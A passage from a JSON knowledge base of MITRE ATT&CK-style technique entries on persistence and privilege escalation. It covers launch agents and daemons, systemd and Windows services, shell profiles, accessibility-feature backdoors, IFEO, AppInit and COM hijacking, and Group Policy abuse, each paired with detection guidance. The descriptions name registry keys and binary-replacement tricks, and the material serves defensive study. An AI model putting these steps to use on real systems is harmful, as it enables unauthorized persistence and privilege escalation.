      },
      "T1543.001": {
        "name": "Launch Agent",
        "description": " \nAdversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in  /System/Library/LaunchAgents ,  /Library/LaunchAgents , and  $HOME/Library/LaunchAgents   \n  \n  \n. These launch agents have property list files which point to the executables that will be launched  \n. \nAdversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  \n  \n. The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in  \n  \n. They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).  ",
        "detection": "\nMonitor Launch Agent creation through additional plist files and utilities such as Objective-See’s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.\n\n"
      },
      "T1543.002": {
        "name": "Systemd Service",
        "description": " \nAdversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.  \n \nSystemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems. \nSystemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the  /etc/systemd/system and  /usr/lib/systemd/system directories and have the file extension  .service . Each service unit file may contain numerous directives that can execute system commands: ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. ExecReload directive covers when a service restarts. ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'. \nAdversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.  \n\nWhile adversaries typically require root privileges to create/modify service unit files in the  /etc/systemd/system and  /usr/lib/systemd/system directories, low privilege users can create/modify service unit files in directories such as  ~/.config/systemd/user/ to achieve user-level persistence.  \n ",
        "detection": "\nSystemd service unit files may be detected by auditing file creation and modification events within the /etc/systemd/system, /usr/lib/systemd/system/, and /home//.config/systemd/user/ directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.Suspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: systemctl list-units -–type=service –all. Analyze the contents of .service files present on the file system and ensure that they refer to legitimate, expected executables.Auditing the execution and command-line arguments of the 'systemctl' utility, as well related utilities such as /usr/sbin/service may reveal malicious systemd service execution.\n\n"
      },
      "T1543.003": {
        "name": "Windows Service",
        "description": " \nAdversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.  \nWindows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and  Reg . \nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system. \nAn adversary may also incorporate  Masquerading by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through  Service Execution .  ",
        "detection": "\nMonitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  Look for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at HKLM\\SYSTEM\\CurrentControlSet\\Services. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.  Creation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045   ). New, benign services may be created during installation of new software.Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1543.004": {
        "name": "Launch Daemon",
        "description": " \nAdversaries may create or modify launch daemons to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in  /System/Library/LaunchDaemons and  /Library/LaunchDaemons   \n. These LaunchDaemons have property list files which point to the executables that will be launched  \n. \nAdversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories  \n. The daemon name may be disguised by using a name from a related operating system or benign software  \n. Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root. \nThe plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.  ",
        "detection": "\nMonitor for launch daemon creation or modification through plist files and utilities such as Objective-See's KnockKnock application. \n\n"
      },
      "T1546": {
        "name": "Event Triggered Execution",
        "description": " \nAdversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. \nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.  \n \n \n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.  ",
        "detection": "\nMonitoring for additions or modifications of mechanisms that could be used to trigger event-based execution, especially the addition of abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network. Also look for changes that do not line up with updates, patches, or other planned administrative activity. These mechanisms may vary by OS, but are typically stored in central repositories that store configuration information such as the Windows Registry, Common Information Model (CIM), and/or specific named files, the last of which can be hashed and compared to known good values. Monitor for processes, API/System calls, and other common ways of manipulating these event repositories. Tools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.  Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement. \n\n"
      },
      "T1546.001": {
        "name": "Change Default File Association",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access  \n  \nor by administrators using the built-in assoc utility.  \nApplications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened. \nSystem file associations are listed under  HKEY_CLASSES_ROOT.[extension] , for example  HKEY_CLASSES_ROOT.txt . The entries point to a handler for that extension located at  HKEY_CLASSES_ROOT[handler] . The various commands are then listed as subkeys underneath the shell key at  HKEY_CLASSES_ROOT[handler]\\shell[action]\\command . For example:   HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command   HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command *  HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command \nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.  \n ",
        "detection": "\nCollect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process.User file association preferences are stored under  [HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts and override associations configured under [HKEY_CLASSES_ROOT]. Changes to a user's preference will occur under this entry's subkeys.Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.\n\n"
      },
      "T1546.002": {
        "name": "Screensaver",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.  \nThe Windows screensaver application scrnsave.scr is located in  C:\\Windows\\System32\\ , and  C:\\Windows\\sysWOW64\\ on 64-bit Windows systems, along with screensavers included with base Windows installations. \nThe following screensaver settings are stored in the Registry (  HKCU\\Control Panel\\Desktop\\ ) and could be manipulated to achieve persistence:  SCRNSAVE.exe - set to malicious PE path  ScreenSaveActive - set to '1' to enable the screensaver  ScreenSaverIsSecure - set to '0' to not require a password to unlock  ScreenSaveTimeout - sets user inactivity timeout before screensaver is executed \nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.  \n ",
        "detection": "\nMonitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.Tools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated.\n\n"
      },
      "T1546.003": {
        "name": "Windows Management Instrumentation Event Subscription",
        "description": " \nAdversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.  \n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.  \n  \nAdversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.  \n  \n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.  ",
        "detection": "\nMonitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence.    Monitor processes and command-line arguments that can be used to register WMI persistence, such as the  Register-WmiEvent PowerShell cmdlet  , as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).\n\n"
      },
      "T1546.004": {
        "name": ".bash_profile and .bashrc",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by a user’s shell.  ~/.bash_profile and  ~/.bashrc are shell scripts that contain shell commands. These files are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. \n ~/.bash_profile is executed for login shells and  ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), the  ~/.bash_profile script is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, the  ~/.bashrc script is executed. This allows users more fine-grained control over when they want certain commands executed. These shell scripts are meant to be written to by the local user to configure their own environment. \nThe macOS Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling  ~/.bash_profile each time instead of  ~/.bashrc . \nAdversaries may abuse these shell scripts by inserting arbitrary shell commands that may be used to execute other binaries to gain persistence. Every time the user logs in or opens a new shell, the modified ~/.bash_profile and/or ~/.bashrc scripts will be executed.  \n ",
        "detection": "\nWhile users may customize their ~/.bashrc and ~/.bash_profile files , there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.\n\n"
      },
      "T1546.005": {
        "name": "Trap",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by an interrupt signal. The  trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like  ctrl+c and  ctrl+d . \nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format  trap 'command list' signals where \"command list\" will be executed when \"signals\" are received.  \n \n ",
        "detection": "\nTrap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.\n\n"
      },
      "T1546.006": {
        "name": "LC_LOAD_DYLIB Addition",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.  \nThere are tools available to perform these changes. \nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.  \n ",
        "detection": "\nMonitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.\n\n"
      },
      "T1546.007": {
        "name": "Netsh Helper DLL",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.  \nThe paths to registered netsh.exe helper DLLs are entered into the Windows Registry at  HKLM\\SOFTWARE\\Microsoft\\Netsh . \nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.  \n \n ",
        "detection": "\nIt is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the HKLM\\SOFTWARE\\Microsoft\\Netsh registry key for any new or suspicious entries that do not correlate with known system files or benign software.  \n\n"
      },
      "T1546.008": {
        "name": "Accessibility Features",
        "description": " \nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system. \nTwo common accessibility programs are  C:\\Windows\\System32\\sethc.exe , launched when the shift key is pressed five times and  C:\\Windows\\System32\\utilman.exe , launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen.  \n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in  %systemdir%\\ , and it must be protected by Windows File or Resource Protection (WFP/WRP).  \nThe  Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. \nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g.,  C:\\Windows\\System32\\utilman.exe ) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over  Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges.  \n\nOther accessibility features exist that may also be leveraged in a similar fashion:  \n \nOn-Screen Keyboard:  C:\\Windows\\System32\\osk.exe Magnifier:  C:\\Windows\\System32\\Magnify.exe Narrator:  C:\\Windows\\System32\\Narrator.exe Display Switcher:  C:\\Windows\\System32\\DisplaySwitch.exe App Switcher:  C:\\Windows\\System32\\AtBroker.exe  ",
        "detection": "\nChanges to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options.\n\n"
      },
      "T1546.009": {
        "name": "AppCert DLLs",
        "description": " \nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the  AppCertDLLs Registry key under  HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions  CreateProcess ,  CreateProcessAsUser ,  CreateProcessWithLoginW ,  CreateProcessWithTokenW , or  WinExec .  \n\nSimilar to  Process Injection , this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.  ",
        "detection": "\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx.   Tools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location.    Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.\n\n"
      },
      "T1546.010": {
        "name": "AppInit DLLs",
        "description": " \nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the  AppInit_DLLs value in the Registry keys  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows or  HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library.  \n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.  \nMalicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.  \n ",
        "detection": "\nMonitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx.  Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs.   Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.\n\n"
      },
      "T1546.011": {
        "name": "Application Shimming",
        "description": " \nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10.  \n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:  %WINDIR%\\AppPatch\\sysmain.sdb and  hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb \nCustom databases are stored in:  %WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom and  hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom \nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to  Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). \nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.  \nShims can also be abused to establish persistence by continuously being invoked by affected programs.  ",
        "detection": "\nThere are several public tools available that will detect shims that are currently available  :Shim-Process-Scanner - checks memory of every running process for any shim flagsShim-Detector-Lite - detects installation of custom shim databasesShim-Guard - monitors registry for any shim installationsShimScanner - forensic tool to find active shims in memoryShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)Monitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.\n\n"
      },
      "T1546.012": {
        "name": "Image File Execution Options Injection",
        "description": " \nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g.,  C:\\dbg\\ntsd.exe -g  notepad.exe ).  \n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.  \nIFEOs are represented as  Debugger values in the Registry under  HKLM\\SOFTWARE{{\\Wow6432Node}}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ where  <executable> is the binary on which the debugger is attached.  \n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).  \n  \nSimilar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\ .  \n  \n\nSimilar to  Accessibility Features , on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with  Remote Desktop Protocol will cause the \"debugger\" program to be executed with SYSTEM privileges.  \n\nSimilar to  Process Injection , these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.  \nInstalling IFEO mechanisms may also provide Persistence via continuous triggered invocation. \nMalware may also use IFEO to  Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.  \n  \n ",
        "detection": "\nMonitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as DEBUG_PROCESS and DEBUG_ONLY_THIS_PROCESS.  Monitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx.  \n\n"
      },
      "T1546.013": {
        "name": "PowerShell Profile",
        "description": " \nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (  profile.ps1 ) is a script that runs when  PowerShell starts and can be used as a logon script to customize user environments. \n PowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for  PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.  \n \nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or  PowerShell drives to gain persistence. Every time a user opens a  PowerShell session the modified script will be executed unless the  -NoProfile flag is used when it is launched.  \n \nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.  \n ",
        "detection": "\nLocations where profile.ps1 can be stored should be monitored for new profiles or modifications.   Example profile locations include:$PsHome\\Profile.ps1$PsHome\\Microsoft.{{HostProgram}}_profile.ps1$Home\\My Documents\\PowerShell\\Profile.ps1$Home\\My Documents\\PowerShell\\Microsoft.{{HostProgram}}_profile.ps1Monitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs.\n\n"
      },
      "T1546.014": {
        "name": "Emond",
        "description": " \nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a  Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at  /sbin/emond will load any rules from the  /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place. \nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path  /private/var/db/emondClients , specified in the  Launch Daemon configuration file at  /System/Library/LaunchDaemons/com.apple.emond.plist .  \n \n \n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.  \n \n \nAdversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the  Launch Daemon service.  ",
        "detection": "\nMonitor emond rules creation by checking for files created or modified in /etc/emond.d/rules/ and /private/var/db/emondClients.\n\n"
      },
      "T1546.015": {
        "name": "Component Object Model Hijacking",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.  \nReferences to various COM objects are stored in the Registry. \nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.  \nAn adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.  ",
        "detection": "\nThere are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: Reg) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID.  Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed. \n\n"
      },
      "T1068": {
        "name": "Exploitation for Privilege Escalation",
        "description": " \nAdversaries may exploit software vulnerabilities in an attempt to collect elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions. \nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising a endpoint system that has been properly configured and limits other privilege escalation methods.  ",
        "detection": "\nDetecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution or evidence of Discovery.Higher privileges are often necessary to perform additional actions such as some methods of OS Credential Dumping. Look for additional activity that may indicate an adversary has gained higher privileges.\n\n"
      },
      "T1484": {
        "name": "Group Policy Modification",
        "description": " \nAdversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path  \\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\ .  \n \n \nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain. \nMalicious GPO modifications can be used to implement many other malicious behaviors such as  Scheduled Task/Job ,  Disable or Modify Tools ,  Ingress Tool Transfer ,  Create Account ,  Service Execution ,  and more.  \n \n \n \n \nSince GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.  \n\nFor example, publicly available scripts such as  New-GPOImmediateTask can be leveraged to automate the creation of a malicious  Scheduled Task/Job by modifying GPO settings, in this case modifying  <GPO_PATH>\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml .  \n \nIn some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in  <GPO_PATH>\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf , to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.  \n ",
        "detection": "\nIt is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including:Event ID 5136 - A directory service object was modifiedEvent ID 5137 - A directory service object was createdEvent ID 5138 - A directory service object was undeletedEvent ID 5139 - A directory service object was movedEvent ID 5141 - A directory service object was deletedGPO abuse will often be accompanied by some other behavior such as Scheduled Task/Job, which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704). \n\n"
      },
      "T1574": {
        "name": "Hijack Execution Flow",
